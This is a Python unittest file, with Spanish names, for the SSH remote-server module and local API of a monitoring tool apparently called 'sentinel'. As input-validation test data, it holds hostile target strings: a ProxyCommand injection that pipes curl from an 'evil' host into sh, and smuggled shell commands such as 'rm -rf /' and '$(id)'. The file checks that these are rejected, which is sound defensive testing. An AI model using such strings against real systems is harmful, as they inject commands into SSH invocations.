from __future__ import annotations

import http.client
import io
import json
import os
import subprocess
import tempfile
import threading
import unittest
import unittest.mock as mock

from helpers import Env, core
from sentinel import cli, remote, ui

RESUMEN = {"hostname": "prod1", "version": "2.7.0", "level": "protegido", "why": "Sin eventos graves", "alive": True, "heartbeat_age": 12,
           "counts24": {"critical": 0, "high": 1, "medium": 2, "low": 0, "info": 0}, "bans": 3, "firewall": {"backend": "ufw", "pendientes": 0, "docker_expuestos": 0}}


class RemoteTests(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp()
        self.env = mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": self.d}); self.env.start()
        remote._cache.clear()

    def tearDown(self):
        self.env.stop()

    def test_destinos_validos_e_invalidos(self):
        for t in ("deploy@192.168.1.20", "jorge@servidor.cl:2222", "a_b-c@host-1.example.com"):
            self.assertTrue(remote.TARGET.match(t), t)
        for t in ("", "sin-usuario.cl", "-oProxyCommand=x@host", "u@h;rm -rf /", "u@h h", "u@h$(id)", "u@-malo", "u@h:99999999", "u@h\nx", "u@host && ls", "u@[::1]", "@host"):
            self.assertFalse(remote.TARGET.match(t), t)

    def test_agregar_quitar_y_limites(self):
        self.assertTrue(remote.add("Producción", "deploy@192.168.1.20")[0])
        self.assertFalse(remote.add("Otro", "deploy@192.168.1.20")[0]); self.assertFalse(remote.add("producción", "x@otro.cl")[0])           # duplicados
        self.assertFalse(remote.add("Mal", "-oProxyCommand=evil@x")[0]); self.assertFalse(remote.add("", "a@b.cl")[0])
        self.assertEqual([s["name"] for s in remote.load()], ["Producción"]); self.assertEqual(oct(os.stat(remote.path()).st_mode & 0o777), "0o600")
        self.assertTrue(remote.remove("deploy@192.168.1.20")); self.assertEqual(remote.load(), [])
        for i in range(remote.MAX_SERVERS):
            self.assertTrue(remote.add(f"S{i}", f"u@h{i}.cl")[0])
        self.assertFalse(remote.add("Uno más", "u@extra.cl")[0])

    def test_un_archivo_manipulado_no_se_ejecuta(self):
        os.makedirs(os.path.dirname(remote.path()), exist_ok=True)
        open(remote.path(), "w").write(json.dumps([{"name": "x", "target": "-oProxyCommand=curl evil|sh@h"}, {"name": "ok", "target": "u@h.cl"}]))
        self.assertEqual([s["target"] for s in remote.load()], ["u@h.cl"])

    def test_el_comando_ssh_es_fijo_y_estricto(self):
        c = remote.ssh_command("deploy@srv.cl:2222")
        self.assertEqual(c[0], "ssh"); self.assertIn("BatchMode=yes", c); self.assertIn("StrictHostKeyChecking=yes", c); self.assertIn("ForwardAgent=no", c)
        self.assertEqual(c[-5:], ["--", "deploy@srv.cl", "sentinel", "resumen", "--json"]); self.assertEqual(c[c.index("-p") + 1], "2222")
        self.assertNotIn("-p", remote.ssh_command("deploy@srv.cl"))

    def poll(self, **k):
        with mock.patch.object(remote.subprocess, "run", return_value=subprocess.CompletedProcess([], **k)) as run:
            return remote.poll({"name": "Prod", "target": "u@h.cl"}, ttl=0), run

    def test_respuesta_buena(self):
        r, run = self.poll(returncode=0, stdout="ruido del banner\n" + json.dumps(RESUMEN) + "\n", stderr="")
        self.assertTrue(r["ok"]); self.assertEqual(r["data"]["level"], "protegido"); self.assertEqual(r["data"]["bans"], 3)

    def test_errores_comprensibles(self):
        self.assertIn("no se pudo", self.poll(returncode=255, stdout="", stderr="Host key verification failed.\n")[0]["error"].lower())
        self.assertIn("no está instalado", self.poll(returncode=127, stdout="", stderr="bash: sentinel: command not found\n")[0]["error"])
        self.assertIn("no es un resumen", self.poll(returncode=0, stdout="hola\n", stderr="")[0]["error"])
        with mock.patch.object(remote.subprocess, "run", side_effect=subprocess.TimeoutExpired("ssh", 15)):
            self.assertIn("a tiempo", remote.poll({"name": "P", "target": "u@h.cl"}, ttl=0)["error"])
        with mock.patch.object(remote.subprocess, "run", side_effect=FileNotFoundError(2, "No such file")):
            self.assertIn("ssh", remote.poll({"name": "P", "target": "u@h.cl"}, ttl=0)["error"])

    def test_cache_corta(self):
        with mock.patch.object(remote.subprocess, "run", return_value=subprocess.CompletedProcess([], 0, stdout=json.dumps(RESUMEN), stderr="")) as run:
            s = {"name": "P", "target": "u@h.cl"}; remote.poll(s, ttl=60); remote.poll(s, ttl=60); self.assertEqual(run.call_count, 1)


class ResumenYApiTests(unittest.TestCase):
    def test_el_comando_resumen_imprime_json(self):
        e = Env()
        try:
            with mock.patch("sys.stdout", io.StringIO()) as out:
                self.assertEqual(cli.main(["resumen", "--json"]), 0)
            d = json.loads(out.getvalue())
            self.assertEqual(d["version"], core.VERSION); self.assertIn(d["level"], ("protegido", "revision", "atencion", "peligro")); self.assertIn("counts24", d)
        finally:
            e.close()

    def test_api_de_servidores_agrega_y_lista(self):
        e = Env(); d = tempfile.mkdtemp()
        try:
            with mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": d}):
                tok = ui.load_token(); srv = ui.Server(0, tok, ui.Data(e.cfg)); srv.restart_enabled = False; port = srv.server_address[1]
                threading.Thread(target=srv.serve_forever, daemon=True).start()
                def call(method, body=None):
                    c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                    c.request(method, "/api/servers", body=json.dumps(body) if body else None, headers={"Host": f"127.0.0.1:{port}", "Cookie": f"sentinel_t={tok}", "Content-Type": "application/json"})
                    r = c.getresponse(); return r.status, json.loads(r.read())
                self.assertEqual(call("GET")[1]["servers"], [])
                self.assertTrue(call("POST", {"op": "add", "name": "Prod", "target": "deploy@10.0.0.5"})[1]["ok"])
                self.assertFalse(call("POST", {"op": "add", "name": "Mal", "target": "-oProxyCommand=x@y"})[1]["ok"])
                with mock.patch.object(remote.subprocess, "run", return_value=subprocess.CompletedProcess([], 0, stdout=json.dumps(RESUMEN), stderr="")):
                    s = call("GET")[1]["servers"]
                self.assertEqual(s[0]["data"]["hostname"], "prod1")
                self.assertTrue(call("POST", {"op": "remove", "target": "deploy@10.0.0.5"})[1]["ok"]); self.assertEqual(call("POST", {"op": "x"}) [0], 400)
                srv.shutdown(); srv.server_close()
        finally:
            e.close()


if __name__ == "__main__":
    unittest.main()
